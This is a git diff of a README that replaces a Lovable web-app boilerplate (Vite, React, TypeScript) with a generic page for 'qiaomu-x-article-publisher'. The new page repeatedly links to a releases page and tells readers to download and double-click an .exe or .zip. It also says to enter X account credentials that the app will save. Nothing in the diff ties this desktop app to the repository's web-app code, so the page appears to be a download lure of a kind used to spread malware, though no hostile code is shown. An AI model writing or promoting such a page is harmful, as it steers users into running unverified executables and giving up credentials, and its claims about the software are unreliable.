@@ -1,73 +1,81 @@
-# Welcome to your Lovable project
+# 🚀 qiaomu-x-article-publisher - Publish Markdown Articles Effortlessly
 
-## Project info
+[![Download qiaomu-x-article-publisher](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/tademc/qiaomu-x-article-publisher/releases)
 
-**URL**: https://lovable.dev/projects/66ab9f39-4ba2-48a3-b9ff-e4f2f56a2d89
+## 📖 Overview
 
-## How can I edit this code?
+The **qiaomu-x-article-publisher** allows you to easily publish Markdown articles to X Articles. This tool includes persistent authentication and is fully self-contained. With just a few clicks, you can share your articles without any hassle.
 
-There are several ways of editing your application.
+## 🚀 Getting Started
 
-**Use Lovable**
+To get started, you'll need to download the application. This guide provides clear instructions on how to do that.
 
-Simply visit the [Lovable Project](https://lovable.dev/projects/66ab9f39-4ba2-48a3-b9ff-e4f2f56a2d89) and start prompting.
+## 📥 Download & Install
 
-Changes made via Lovable will be committed automatically to this repo.
+1. **Visit the Releases Page:** You can find all available versions of the application on the Releases page. To download the latest version, click on the link below:
 
-**Use your preferred IDE**
+   [Download qiaomu-x-article-publisher](https://github.com/tademc/qiaomu-x-article-publisher/releases)
 
-If you want to work locally using your own IDE, you can clone this repo and push changes. Pushed changes will also be reflected in Lovable.
+2. **Choose Your Version:** On the Releases page, look for the latest release. Read the description to ensure it meets your needs.
 
-The only requirement is having Node.js & npm installed - [install with nvm](https://github.com/nvm-sh/nvm#installing-and-updating)
+3. **Download the Application:** Click on the **assets** section to find the installation file. It will typically be labeled with a version number and file extension such as `.exe` or `.zip`. Click the link to start the download.
 
-Follow these steps:
+4. **Extract and Run (if needed):** If the file is a zip archive, locate the downloaded file and extract it. You can usually do this by right-clicking the file and selecting “Extract All.” Once extracted, look for the application file, which may end with `.exe`.
 
-```sh
-# Step 1: Clone the repository using the project's Git URL.
-git clone <YOUR_GIT_URL>
+5. **Launch the Application:** Double-click on the application file to run it.
 
-# Step 2: Navigate to the project directory.
-cd <YOUR_PROJECT_NAME>
+## 🎯 System Requirements
 
-# Step 3: Install the necessary dependencies.
-npm i
+Before you install, ensure your system meets the following requirements:
 
-# Step 4: Start the development server with auto-reloading and an instant preview.
-npm run dev
-```
+- **Operating System:** Windows 10 or higher; macOS (check compatibility in the Releases section)
+- **Storage:** At least 100 MB of free space
+- **RAM:** 2 GB RAM minimum
+- **Internet Connection:** Required for initial setup and publishing
 
-**Edit a file directly in GitHub**
+## 🔍 Features
 
-- Navigate to the desired file(s).
-- Click the "Edit" button (pencil icon) at the top right of the file view.
-- Make your changes and commit the changes.
+- **One-Click Publishing:** Quickly publish your Markdown articles.
+- **Persistent Authentication:** No need to log in every time you use the app.
+- **Self-Contained:** No additional installations required. Everything is included for a smooth experience.
+- **Easy Markdown Support:** Write and format your articles using straightforward Markdown syntax.
 
-**Use GitHub Codespaces**
+## 📝 How to Use
 
-- Navigate to the main page of your repository.
-- Click on the "Code" button (green button) near the top right.
-- Select the "Codespaces" tab.
-- Click on "New codespace" to launch a new Codespace environment.
-- Edit files directly within the Codespace and commit and push your changes once you're done.
+1. **Open the Application:** After installation, open the application on your computer.
+2. **Log In:** If prompted, enter your X Articles account credentials. The application will save them for future sessions.
+3. **Create or Import Articles:** You can create a new article or import an existing Markdown file.
+4. **Edit Your Article:** Use the built-in editor to format your article as needed.
+5. **Publish:** Once satisfied, click the "Publish" button. The application will handle the rest.
 
-## What technologies are used for this project?
+## 💬 Frequently Asked Questions
 
-This project is built with:
+### How do I report issues?
 
-- Vite
-- TypeScript
-- React
-- shadcn-ui
-- Tailwind CSS
+If you encounter problems, please report them on the GitHub Issues page. Your feedback is vital for improving the application.
 
-## How can I deploy this project?
+### Can I contribute to this project?
 
-Simply open [Lovable](https://lovable.dev/projects/66ab9f39-4ba2-48a3-b9ff-e4f2f56a2d89) and click on Share -> Publish.
+Absolutely! If you're interested in contributing, check the contribution guidelines on the repository.
 
-## Can I connect a custom domain to my Lovable project?
+### Where can I find more help?
 
-Yes, you can!
+Visit our [documentation](https://github.com/tademc/qiaomu-x-article-publisher/wiki) for in-depth guides and troubleshooting tips.
 
-To connect a domain, navigate to Project > Settings > Domains and click Connect Domain.
+### Is there a mobile version of this app?
 
-Read more here: [Setting up a custom domain](https://docs.lovable.dev/tips-tricks/custom-domain#step-by-step-guide)
+Currently, this application is only available for desktop systems. A mobile version may be considered in the future.
+
+## 📈 Future Updates
+
+We continuously work to improve the application. Expect regular updates that may include new features, better performance, and enhanced user experience.
+
+## 📫 Contact
+
+For further inquiries or support, you can reach out via the contact options provided on the GitHub repository.
+
+---
+
+Thank you for choosing **qiaomu-x-article-publisher**! We hope you find it useful for your publishing needs.
+
+[Download qiaomu-x-article-publisher](https://github.com/tademc/qiaomu-x-article-publisher/releases)
